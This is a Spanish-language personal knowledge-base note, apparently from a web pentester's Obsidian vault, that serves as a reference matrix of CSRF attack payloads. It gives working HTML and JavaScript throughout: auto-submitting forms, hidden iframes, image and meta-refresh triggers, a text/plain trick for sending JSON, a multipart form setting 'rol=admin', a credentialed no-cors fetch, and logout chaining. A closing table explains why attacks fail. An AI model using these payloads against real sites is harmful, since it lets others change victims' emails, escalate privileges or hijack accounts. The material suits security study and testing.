---
tipo: meta
aliases:
  - payloads CSRF
  - CSRF PoC
tags:
  - meta/referencia
  - dominio/web
---

# CSRF entrega - matriz de referencia

> [!info] Referencia pura, no un zettel
> El HTML que dispara la petición. Qué defensa hay que romper primero está en [[MOC - CSRF]]; los bypass, en [[CSRF bypass - matriz de referencia]].

## 0. Qué se puede mandar sin permiso del servidor

El navegador manda sin preguntar si el método es `GET`, `HEAD` o `POST` **y** el tipo de contenido es uno de estos tres. Todo lo demás dispara el control previo de CORS, que es una defensa que no se evade.

| Tipo de contenido | ¿Simple? | Cómo se manda |
|---|---|---|
| `application/x-www-form-urlencoded` | Sí | Formulario normal |
| `multipart/form-data` | Sí | `enctype="multipart/form-data"` |
| `text/plain` | Sí | `enctype="text/plain"` — la vía a las API JSON |
| `application/json` | **No** | Control previo. Sin bypass no hay ataque |

Cualquier cabecera personalizada —`X-Requested-With`, `X-CSRF-Token`— saca a la petición del conjunto simple **por el solo hecho de existir**. Su valor no importa.

## 1. `GET` — la más simple

`<img src="https://objetivo.com/cambiar?email=yo@evil.com">`
Se dispara sola al cargar la página. No necesita interacción ni JavaScript.

`<link rel="stylesheet" href="https://objetivo.com/borrar?id=1">`
`<script src="https://objetivo.com/accion?x=1"></script>`
Alternativas cuando `img` está filtrado por política de contenido.

```html
<meta http-equiv="refresh" content="0; url=https://objetivo.com/accion?x=1">
```
Navegación de nivel superior: es la que **sí pasa con `SameSite=Lax`**. Ver [[CSRF - bypass de SameSite]].

`window.open('https://objetivo.com/accion?x=1')`
Lo mismo desde JavaScript, y también cuenta como nivel superior.

## 2. `POST` con autoenvío

```html
<form action="https://objetivo.com/cambiar-email" method="POST" id="f">
  <input type="hidden" name="email" value="yo@evil.com">
  <input type="hidden" name="csrf" value="TOKEN_DE_MI_CUENTA">
</form>
<script>document.getElementById('f').submit()</script>
```

El campo `csrf` solo se incluye cuando el token existe y **no está ligado a la sesión** — ver [[CSRF - token ausente o no ligado]]. Si está ligado, mandarlo es peor que omitirlo.

Sin JavaScript, cuando la página del ataque no lo permite:

```html
<form action="https://objetivo.com/accion" method="POST">
  <input type="submit" value="Ver el video">
</form>
```

O dentro de un iframe invisible, para que la víctima no vea la navegación:

```html
<iframe style="display:none" name="x"></iframe>
<form action="https://objetivo.com/accion" method="POST" target="x" id="f">
  <input type="hidden" name="a" value="1">
</form>
<script>f.submit()</script>
```

> [!warning] El iframe se rompe con `X-Frame-Options`
> No la petición: la que se rompe es la **página del ataque** si intenta enmarcar al objetivo para leerlo. Para CSRF ciego el iframe solo oculta la navegación, y eso funciona igual porque no hace falta leer la respuesta.

## 3. JSON desde un formulario — el truco de `text/plain`

El navegador serializa `text/plain` como `nombre=valor` con un salto de línea al final. Se pone casi todo el JSON en el **nombre** y se cierra con el valor:

```html
<form action="https://objetivo.com/api/perfil" method="POST" enctype="text/plain" id="f">
  <input name='{"email":"yo@evil.com","x":"' value='"}'>
</form>
<script>f.submit()</script>
```

Cuerpo resultante:

```
{"email":"yo@evil.com","x":"="}
```

El `=` queda dentro de un valor de relleno, así que el JSON es sintácticamente válido. Ese campo `x` no existe en la API y se ignora — su única función es absorber el `=` que el navegador inserta.

Si el servidor no tolera `text/plain`, probar antes lo barato:

`email=yo@evil.com` con `application/x-www-form-urlencoded`
Muchos marcos de trabajo mapean el cuerpo de formulario a los mismos campos que el JSON.

Ver [[CSRF - endpoint que espera JSON]].

## 4. Multipart

```html
<form action="https://objetivo.com/subir" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="rol" value="admin">
</form>
```

Simple según CORS, y es la única de las tres que permite enviar archivos. Se usa contra endpoints de subida — ahí el dominio se cruza con [[MOC - File upload]].

## 5. `fetch` con credenciales

```html
<script>
fetch('https://objetivo.com/api/perfil', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"email":"yo@evil.com"}',
  mode: 'no-cors'
})
</script>
```

`credentials: 'include'` es obligatorio o las cookies no viajan. `mode: 'no-cors'` evita que el navegador aborte por no poder leer la respuesta — la petición **se manda igual**, solo que el resultado es opaco. Para CSRF eso alcanza: no se lee nada.

Es más cómodo que el formulario para iterar, y no sirve cuando hace falta `application/json`.

## 6. Encadenar con una redirección

```html
<meta http-equiv="refresh" content="0; url=https://objetivo.com/logout">
```

Cerrar la sesión y volver a atacar sirve para dos cosas: reiniciar el reloj de la ventana de gracia de `SameSite`, y para el CSRF de inicio de sesión —autenticar a la víctima **en la cuenta del atacante** para que su actividad quede registrada ahí.

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `403` con token mandado | El token está ligado a la sesión. Esa rama se cierra |
| `403` sin token | Se valida siempre. Probar cambio de método y `Referer` |
| `200` y la acción no ocurre | La aplicación aceptó y descartó. Revisar si falta un campo obligatorio |
| El control previo aparece en la consola | Hay cabecera personalizada o `application/json`. No hay ataque por esta vía |
| `415 Unsupported Media Type` | El servidor exige el tipo de contenido real. Fin de [[CSRF - endpoint que espera JSON]] |
| El JSON llega malformado | Falta el campo de relleno que absorbe el `=` de `text/plain` |
| Funciona en el navegador de prueba y no en otro | Diferencia de `SameSite` entre navegadores. Reconfirmar contra el objetivo |
| La cookie no viaja en el `fetch` | Falta `credentials: 'include'` |

## Relacionadas

[[MOC - CSRF]] · [[CSRF bypass - matriz de referencia]] · [[CWE-352 - Cross-Site Request Forgery]] · [[Sesión - matriz de referencia]]
